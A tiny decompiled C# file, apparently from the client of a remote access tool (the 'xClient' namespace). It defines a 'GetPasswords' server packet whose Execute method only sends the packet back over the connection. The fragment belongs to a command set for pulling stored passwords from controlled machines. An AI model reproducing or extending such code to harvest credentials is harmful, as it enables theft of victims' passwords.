using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x02000044 RID: 68
	[Serializable]
	public class GetPasswords : IPacket
	{
		// Token: 0x060001CF RID: 463 RVA: 0x00002DB8 File Offset: 0x00000FB8
		public void Execute(Client client)
		{
			client.Send<GetPasswords>(this);
		}
	}
}
